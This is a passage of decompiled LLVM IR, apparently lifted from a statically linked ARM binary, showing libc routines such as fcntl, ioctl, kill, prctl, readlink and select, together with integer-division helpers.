  %v4_1a284 = phi i32 [ %v4_1a280, %.thread21 ], [ %v5_1a280, %bb111 ]
  %v2_1a284 = xor i1 %v2_1a27c, true
  %v3_1a284 = or i1 %v7_1a27c, %v2_1a284
  br i1 %v3_1a284, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1a284 = udiv i32 %v5_1a284, 2
  %v9_1a284 = add i32 %v4_1a284, %v8_1a284
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1a28c = phi i32 [ %v4_1a284, %bb112 ], [ %v9_1a284, %bb113 ]
  %v1_1a288 = icmp slt i32 %v2_1a184, 0
  %v6_1a28c = lshr i32 %v0_1a28c, %v1_1a28c
  %v2_1a290 = sub i32 0, %v6_1a28c
  %v2_1a290.v6_1a28c = select i1 %v1_1a288, i32 %v2_1a290, i32 %v6_1a28c
  ret i32 %v2_1a290.v6_1a28c

dec_label_pc_1a298:                               ; preds = %entry
  %v0_1a29c = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1a284, { 1, 0 }
  uselistorder i1 %v7_1a27c, { 1, 0 }
  uselistorder i32 %v4_1a274, { 1, 0 }
  uselistorder i32 %v1_1a274, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a268, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1a268, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a258, { 1, 0 }
  uselistorder i32 %v0_1a21c, { 1, 0 }
  uselistorder i32 %v4_1a210, { 1, 0 }
  uselistorder i32 %v1_1a218, { 1, 2, 0 }
  uselistorder i32 %v4_1a204, { 1, 0 }
  uselistorder i32 %v1_1a20c, { 1, 2, 0 }
  uselistorder i32 %v4_1a1f8, { 1, 0 }
  uselistorder i32 %v1_1a200, { 1, 2, 0 }
  uselistorder i32 %v1_1a224, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1a1f4, { 1, 0 }
  uselistorder i32 %v1_1a220, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1a1e0, { 1, 0 }
  uselistorder i32 %v3_1a1dc, { 1, 0 }
  uselistorder i32 %v1_1a1dc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1a1d8, { 1, 0 }
  uselistorder i32 %v1_1a1e0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1a1cc, { 1, 0 }
  uselistorder i32 %v4_1a1c8, { 2, 1, 0 }
  uselistorder i32 %v1_1a1cc, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1a1d4.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1a1a0, { 1, 0 }
  uselistorder i32 %v1_1a258, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1a184, { 1, 0, 2 }
  uselistorder i32 %v0_1a180, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 65535, { 50, 51, 5, 4, 3, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 1, 40, 41, 42, 44, 43, 2, 45, 46, 47, 48, 49 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1a22c, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1a1e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a1d4thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1a2b0 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1a2b0
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_1a2cc = call i32 @__GI_raise(i32 8)
  ret i32 %v1_1a2cc
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_1a2e8 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_1a2e8, 2
  br i1 %tmp, label %dec_label_pc_1a324, label %dec_label_pc_1a300

dec_label_pc_1a300:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_1a358, label %dec_label_pc_1a314

dec_label_pc_1a314:                               ; preds = %dec_label_pc_1a300
  %v0_1a318 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_1a34c

dec_label_pc_1a324:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_1a340, label %dec_label_pc_1a358

dec_label_pc_1a340:                               ; preds = %dec_label_pc_1a324
  %v0_1a344 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_1a34c

dec_label_pc_1a34c:                               ; preds = %dec_label_pc_1a314, %dec_label_pc_1a340
  %storemerge2 = phi i32 [ %v0_1a318, %dec_label_pc_1a314 ], [ %v0_1a344, %dec_label_pc_1a340 ]
  %storemerge.in = load i16, i16* @global_var_2c068.414, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_1a34c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a34c = sub i32 0, %v0_1a34c
  store i32 %v1_1a34c, i32* %r2.global-to-local, align 4
  %v3_1a350 = add i32 %storemerge, %storemerge2
  %v4_1a350 = inttoptr i32 %v3_1a350 to i32*
  store i32 %v1_1a34c, i32* %v4_1a350, align 4
  br label %dec_label_pc_1a358

dec_label_pc_1a358:                               ; preds = %dec_label_pc_1a300, %dec_label_pc_1a324, %dec_label_pc_1a34c
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1a34c ], [ %arg1, %dec_label_pc_1a324 ], [ %arg1, %dec_label_pc_1a300 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_1a358, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a34c, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_1a370 = load i32, i32* @r2, align 4
  %v3_1a374 = load i32, i32* @r4, align 4
  store i32 %v3_1a374, i32* %stack_var_-32, align 4
  %v6_1a374 = load i32, i32* @r5, align 4
  %v12_1a374 = load i32, i32* @r7, align 4
  %v4_1a384 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 14008) to i32*), align 4
  %v2_1a390 = icmp eq i32 %v4_1a384, 0
  %v0_1a398 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a398, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_1a370, i32* @r4, align 4
  br i1 %v2_1a390, label %dec_label_pc_1a3b4, label %dec_label_pc_1a3a8

dec_label_pc_1a3a8:                               ; preds = %entry
  %v7_1a3a8 = icmp eq i32 %arg2, 7
  br i1 %v7_1a3a8, label %dec_label_pc_1a3f4, label %bb

bb:                                               ; preds = %dec_label_pc_1a3a8
  %v8_1a3ac = icmp eq i32 %arg2, 14
  br i1 %v8_1a3ac, label %dec_label_pc_1a3f4, label %dec_label_pc_1a3b4

dec_label_pc_1a3b4:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_1a398, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_1a398, -4095
  br i1 %tmp, label %dec_label_pc_1a3ec, label %dec_label_pc_1a3d4

dec_label_pc_1a3d4:                               ; preds = %dec_label_pc_1a3b4
  %v0_1a3d8 = call i32 @__aeabi_read_tp()
  %v3_1a3dc = load i16, i16* @global_var_2c068.414, align 2
  %v4_1a3dc = sext i16 %v3_1a3dc to i32
  %v0_1a3e0 = load i32, i32* @r2, align 4
  %v1_1a3e0 = sub i32 0, %v0_1a3e0
  store i32 %v1_1a3e0, i32* @r2, align 4
  %v3_1a3e4 = add i32 %v4_1a3dc, %v0_1a3d8
  %v4_1a3e4 = inttoptr i32 %v3_1a3e4 to i32*
  store i32 %v1_1a3e0, i32* %v4_1a3e4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a3ec

dec_label_pc_1a3ec:                               ; preds = %dec_label_pc_1a3b4, %dec_label_pc_1a3d4
  %v0_1a3ec = phi i32 [ %v0_1a398, %dec_label_pc_1a3b4 ], [ -1, %dec_label_pc_1a3d4 ]
  br label %dec_label_pc_1a440

dec_label_pc_1a3f4:                               ; preds = %dec_label_pc_1a3a8, %bb
  %v0_1a3f4 = call i32 @__libc_enable_asynccancel()
  %v0_1a3f8 = load i32, i32* @r7, align 4
  store i32 %v0_1a3f8, i32* @r1, align 4
  store i32 %v0_1a3f4, i32* %r6.global-to-local, align 4
  %v0_1a404 = load i32, i32* @r5, align 4
  store i32 %v0_1a404, i32* %r0.global-to-local, align 4
  store i32 %v0_1a404, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_1a404, -4095
  br i1 %tmp15, label %dec_label_pc_1a434, label %dec_label_pc_1a41c

dec_label_pc_1a41c:                               ; preds = %dec_label_pc_1a3f4
  %v1_1a420 = sub i32 0, %v0_1a404
  %v0_1a424 = call i32 @__aeabi_read_tp()
  store i32 %v0_1a424, i32* %r0.global-to-local, align 4
  %v3_1a428 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1a428 = sext i16 %v3_1a428 to i32
  %v3_1a42c = add i32 %v4_1a428, %v0_1a424
  %v4_1a42c = inttoptr i32 %v3_1a42c to i32*
  store i32 %v1_1a420, i32* %v4_1a42c, align 4
  store i32 -1, i32* @r2, align 4
  %v0_1a434.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a434

dec_label_pc_1a434:                               ; preds = %dec_label_pc_1a3f4, %dec_label_pc_1a41c
  %v0_1a438 = phi i32 [ %v0_1a404, %dec_label_pc_1a3f4 ], [ -1, %dec_label_pc_1a41c ]
  %v0_1a434 = phi i32 [ %v0_1a3f4, %dec_label_pc_1a3f4 ], [ %v0_1a434.pre, %dec_label_pc_1a41c ]
  store i32 %v0_1a434, i32* %r0.global-to-local, align 4
  store i32 %v0_1a438, i32* @r7, align 4
  %v1_1a43c = call i32 @__libc_disable_asynccancel(i32 %v0_1a434)
  store i32 %v1_1a43c, i32* %r0.global-to-local, align 4
  %v0_1a440.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1a440

dec_label_pc_1a440:                               ; preds = %dec_label_pc_1a3ec, %dec_label_pc_1a434
  %v0_1a440 = phi i32 [ %v0_1a3ec, %dec_label_pc_1a3ec ], [ %v0_1a440.pre, %dec_label_pc_1a434 ]
  store i32 %v0_1a440, i32* %r0.global-to-local, align 4
  %v2_1a448 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1a448, i32* @r4, align 4
  store i32 %v6_1a374, i32* @r5, align 4
  store i32 %v12_1a374, i32* @r7, align 4
  ret i32 %v0_1a440

; uselistorder directives
  uselistorder i32 %v0_1a440, { 1, 0 }
  uselistorder i32 %v0_1a434, { 1, 0 }
  uselistorder i32 %v0_1a404, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_1a398, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_1a440, { 1, 0 }
  uselistorder label %dec_label_pc_1a434, { 1, 0 }
  uselistorder label %dec_label_pc_1a3f4, { 1, 0 }
  uselistorder label %dec_label_pc_1a3ec, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a464 = load i32, i32* @r7, align 4
  store i32 %v3_1a464, i32* %stack_var_-8, align 4
  %v0_1a470 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a470, -4095
  br i1 %tmp, label %dec_label_pc_1a490, label %dec_label_pc_1a478

dec_label_pc_1a478:                               ; preds = %entry
  %v1_1a47c = sub i32 0, %v0_1a470
  %v3_1a480 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1a480 = sext i16 %v3_1a480 to i32
  %v0_1a484 = call i32 @__aeabi_read_tp()
  %v3_1a488 = add i32 %v4_1a480, %v0_1a484
  %v4_1a488 = inttoptr i32 %v3_1a488 to i32*
  store i32 %v1_1a47c, i32* %v4_1a488, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1a490.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1a490

dec_label_pc_1a490:                               ; preds = %entry, %dec_label_pc_1a478
  %v1_1a494 = phi i32 [ %v0_1a470, %entry ], [ -1, %dec_label_pc_1a478 ]
  %v2_1a490 = phi i32 [ %v3_1a464, %entry ], [ %v2_1a490.pre, %dec_label_pc_1a478 ]
  store i32 %v2_1a490, i32* @r7, align 4
  ret i32 %v1_1a494

; uselistorder directives
  uselistorder i32 %v0_1a470, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a490, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_1a4ac = load i32, i32* @r0, align 4
  ret i32 %v1_1a4ac
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_1a4b0 = load i32, i32* @r3, align 4
  store i32 %v9_1a4b0, i32* %stack_var_-4, align 4
  %v3_1a4b4 = load i32, i32* @r4, align 4
  store i32 %v3_1a4b4, i32* %stack_var_-32, align 4
  %v6_1a4b4 = load i32, i32* @r5, align 4
  %v12_1a4b4 = load i32, i32* @r7, align 4
  %v4_1a4c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 14008) to i32*), align 4
  %v2_1a4cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1a4cc, i32* @r3, align 4
  %v2_1a4d0 = icmp eq i32 %v4_1a4c4, 0
  %v0_1a4d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a4d8, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_1a4d0, label %dec_label_pc_1a4e8, label %dec_label_pc_1a520

dec_label_pc_1a4e8:                               ; preds = %entry
  store i32 %arg2, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_1a4d8, -4095
  br i1 %tmp, label %dec_label_pc_1a518, label %dec_label_pc_1a500

dec_label_pc_1a500:                               ; preds = %dec_label_pc_1a4e8
  %v1_1a504 = sub i32 0, %v0_1a4d8
  %v3_1a508 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1a508 = sext i16 %v3_1a508 to i32
  store i32 %v4_1a508, i32* @r3, align 4
  %v0_1a50c = call i32 @__aeabi_read_tp()
  %v2_1a510 = load i32, i32* @r3, align 4
  %v3_1a510 = add i32 %v2_1a510, %v0_1a50c
  %v4_1a510 = inttoptr i32 %v3_1a510 to i32*
  store i32 %v1_1a504, i32* %v4_1a510, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a518

dec_label_pc_1a518:                               ; preds = %dec_label_pc_1a4e8, %dec_label_pc_1a500
  %v0_1a518 = phi i32 [ %v0_1a4d8, %dec_label_pc_1a4e8 ], [ -1, %dec_label_pc_1a500 ]
  br label %dec_label_pc_1a56c

dec_label_pc_1a520:                               ; preds = %entry
  %v0_1a520 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1a520, i32* %r6.global-to-local, align 4
  %v0_1a52c = load i32, i32* @r5, align 4
  store i32 %v0_1a52c, i32* @r1, align 4
  %v0_1a530 = load i32, i32* @r4, align 4
  store i32 %v0_1a530, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_1a530, -4095
  br i1 %tmp15, label %dec_label_pc_1a560, label %dec_label_pc_1a548

dec_label_pc_1a548:                               ; preds = %dec_label_pc_1a520
  %v1_1a54c = sub i32 0, %v0_1a530
  %v3_1a550 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1a550 = sext i16 %v3_1a550 to i32
  store i32 %v4_1a550, i32* @r3, align 4
  %v0_1a554 = call i32 @__aeabi_read_tp()
  store i32 %v0_1a554, i32* %r0.global-to-local, align 4
  %v2_1a558 = load i32, i32* @r3, align 4
  %v3_1a558 = add i32 %v2_1a558, %v0_1a554
  %v4_1a558 = inttoptr i32 %v3_1a558 to i32*
  store i32 %v1_1a54c, i32* %v4_1a558, align 4
  %v0_1a560.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a560

dec_label_pc_1a560:                               ; preds = %dec_label_pc_1a520, %dec_label_pc_1a548
  %v0_1a564 = phi i32 [ %v0_1a530, %dec_label_pc_1a520 ], [ -1, %dec_label_pc_1a548 ]
  %v0_1a560 = phi i32 [ %v0_1a520, %dec_label_pc_1a520 ], [ %v0_1a560.pre, %dec_label_pc_1a548 ]
  store i32 %v0_1a560, i32* %r0.global-to-local, align 4
  store i32 %v0_1a564, i32* @r7, align 4
  %v1_1a568 = call i32 @__libc_disable_asynccancel(i32 %v0_1a560)
  store i32 %v1_1a568, i32* %r0.global-to-local, align 4
  %v0_1a56c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1a56c

dec_label_pc_1a56c:                               ; preds = %dec_label_pc_1a518, %dec_label_pc_1a560
  %v0_1a56c = phi i32 [ %v0_1a518, %dec_label_pc_1a518 ], [ %v0_1a56c.pre, %dec_label_pc_1a560 ]
  store i32 %v0_1a56c, i32* %r0.global-to-local, align 4
  %v2_1a574 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1a574, i32* @r4, align 4
  store i32 %v6_1a4b4, i32* @r5, align 4
  store i32 %v12_1a4b4, i32* @r7, align 4
  ret i32 %v0_1a56c

; uselistorder directives
  uselistorder i32 %v0_1a56c, { 1, 0 }
  uselistorder i32 %v0_1a560, { 1, 0 }
  uselistorder i32 %v0_1a530, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a4d8, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1a56c, { 1, 0 }
  uselistorder label %dec_label_pc_1a560, { 1, 0 }
  uselistorder label %dec_label_pc_1a518, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a590 = load i32, i32* @r7, align 4
  store i32 %v3_1a590, i32* %stack_var_-8, align 4
  %v0_1a59c = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a59c, -4095
  br i1 %tmp, label %dec_label_pc_1a5bc, label %dec_label_pc_1a5a4

dec_label_pc_1a5a4:                               ; preds = %entry
  %v1_1a5a8 = sub i32 0, %v0_1a59c
  %v3_1a5ac = load i16, i16* @global_var_2c068.414, align 2
  %v4_1a5ac = sext i16 %v3_1a5ac to i32
  %v0_1a5b0 = call i32 @__aeabi_read_tp()
  %v3_1a5b4 = add i32 %v4_1a5ac, %v0_1a5b0
  %v4_1a5b4 = inttoptr i32 %v3_1a5b4 to i32*
  store i32 %v1_1a5a8, i32* %v4_1a5b4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1a5bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1a5bc

dec_label_pc_1a5bc:                               ; preds = %entry, %dec_label_pc_1a5a4
  %v1_1a5c0 = phi i32 [ %v0_1a59c, %entry ], [ -1, %dec_label_pc_1a5a4 ]
  %v2_1a5bc = phi i32 [ %v3_1a590, %entry ], [ %v2_1a5bc.pre, %dec_label_pc_1a5a4 ]
  store i32 %v2_1a5bc, i32* @r7, align 4
  ret i32 %v1_1a5c0

; uselistorder directives
  uselistorder i32 %v0_1a59c, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a5bc, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1a5c8 = load i32, i32* @r4, align 4
  store i32 %v3_1a5c8, i32* %stack_var_-12, align 4
  %v0_1a5d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a5d8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a5d8, -4095
  br i1 %tmp, label %dec_label_pc_1a600, label %dec_label_pc_1a5e8

dec_label_pc_1a5e8:                               ; preds = %entry
  %v0_1a5ec = call i32 @__aeabi_read_tp()
  %v3_1a5f0 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1a5f0 = sext i16 %v3_1a5f0 to i32
  %v0_1a5f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a5f4 = sub i32 0, %v0_1a5f4
  store i32 %v1_1a5f4, i32* %r2.global-to-local, align 4
  %v3_1a5f8 = add i32 %v4_1a5f0, %v0_1a5ec
  %v4_1a5f8 = inttoptr i32 %v3_1a5f8 to i32*
  store i32 %v1_1a5f4, i32* %v4_1a5f8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1a600.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1a600

dec_label_pc_1a600:                               ; preds = %entry, %dec_label_pc_1a5e8
  %v1_1a604 = phi i32 [ %v0_1a5d8, %entry ], [ -1, %dec_label_pc_1a5e8 ]
  %v2_1a600 = phi i32 [ %v3_1a5c8, %entry ], [ %v2_1a600.pre, %dec_label_pc_1a5e8 ]
  store i32 %v2_1a600, i32* @r4, align 4
  ret i32 %v1_1a604

; uselistorder directives
  uselistorder i32 %v0_1a5d8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a600, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a60c = load i32, i32* @r7, align 4
  store i32 %v3_1a60c, i32* %stack_var_-8, align 4
  %v0_1a618 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a618, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a618, -4095
  br i1 %tmp, label %dec_label_pc_1a640, label %dec_label_pc_1a628

dec_label_pc_1a628:                               ; preds = %entry
  %v0_1a62c = call i32 @__aeabi_read_tp()
  %v3_1a630 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1a630 = sext i16 %v3_1a630 to i32
  %v0_1a634 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a634 = sub i32 0, %v0_1a634
  store i32 %v1_1a634, i32* %r2.global-to-local, align 4
  %v3_1a638 = add i32 %v4_1a630, %v0_1a62c
  %v4_1a638 = inttoptr i32 %v3_1a638 to i32*
  store i32 %v1_1a634, i32* %v4_1a638, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1a640.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1a640

dec_label_pc_1a640:                               ; preds = %entry, %dec_label_pc_1a628
  %v1_1a644 = phi i32 [ %v0_1a618, %entry ], [ -1, %dec_label_pc_1a628 ]
  %v2_1a640 = phi i32 [ %v3_1a60c, %entry ], [ %v2_1a640.pre, %dec_label_pc_1a628 ]
  store i32 %v2_1a640, i32* @r7, align 4
  ret i32 %v1_1a644

; uselistorder directives
  uselistorder i32 %v0_1a618, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a640, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1a64c = load i32, i32* @r4, align 4
  store i32 %v3_1a64c, i32* %stack_var_-12, align 4
  %v0_1a65c = load i32, i32* @r0, align 4
  store i32 %v0_1a65c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a65c, -4095
  br i1 %tmp, label %dec_label_pc_1a684, label %dec_label_pc_1a66c

dec_label_pc_1a66c:                               ; preds = %entry
  %v0_1a670 = call i32 @__aeabi_read_tp()
  %v3_1a674 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1a674 = sext i16 %v3_1a674 to i32
  %v0_1a678 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a678 = sub i32 0, %v0_1a678
  store i32 %v1_1a678, i32* %r2.global-to-local, align 4
  %v3_1a67c = add i32 %v4_1a674, %v0_1a670
  %v4_1a67c = inttoptr i32 %v3_1a67c to i32*
  store i32 %v1_1a678, i32* %v4_1a67c, align 4
  %v2_1a684.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1a684

dec_label_pc_1a684:                               ; preds = %entry, %dec_label_pc_1a66c
  %v1_1a688 = phi i32 [ %v0_1a65c, %entry ], [ -1, %dec_label_pc_1a66c ]
  %v2_1a684 = phi i32 [ %v3_1a64c, %entry ], [ %v2_1a684.pre, %dec_label_pc_1a66c ]
  store i32 %v2_1a684, i32* @r4, align 4
  ret i32 %v1_1a688

; uselistorder directives
  uselistorder i32 %v0_1a65c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a684, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1a690 = load i32, i32* @r4, align 4
  store i32 %v3_1a690, i32* %stack_var_-28, align 4
  %v6_1a690 = load i32, i32* @r5, align 4
  %v9_1a690 = load i32, i32* @r6, align 4
  %v12_1a690 = load i32, i32* @r7, align 4
  %v15_1a690 = load i32, i32* @r8, align 4
  %v18_1a690 = load i32, i32* @sl, align 4
  %v21_1a690 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @ip, align 4
  %v4_1a6a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 14008) to i32*), align 4
  %v2_1a6a8 = icmp eq i32 %v4_1a6a0, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_1a6a8, label %dec_label_pc_1a6c4, label %entry.dec_label_pc_1a6d0_crit_edge

entry.dec_label_pc_1a6d0_crit_edge:               ; preds = %entry
  br label %dec_label_pc_1a6d0

dec_label_pc_1a6c4:                               ; preds = %entry
  store i32 %v3_1a690, i32* @r4, align 4
  store i32 %v9_1a690, i32* @r6, align 4
  store i32 %v12_1a690, i32* @r7, align 4
  store i32 %v15_1a690, i32* @r8, align 4
  store i32 %v18_1a690, i32* %sl.global-to-local, align 4
  %v0_1a6cc = call i32 @__syscall_select()
  br label %dec_label_pc_1a6d0

dec_label_pc_1a6d0:                               ; preds = %entry.dec_label_pc_1a6d0_crit_edge, %dec_label_pc_1a6c4
  %v0_1a6d0 = call i32 @__libc_enable_asynccancel()
  %v0_1a6d4 = load i32, i32* @r6, align 4
  store i32 %v0_1a6d4, i32* @r1, align 4
  store i32 %v0_1a6d0, i32* @r5, align 4
  %v0_1a6e4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_1a6e4, i32* @r0, align 4
  %v0_1a6ec = call i32 @__syscall_select()
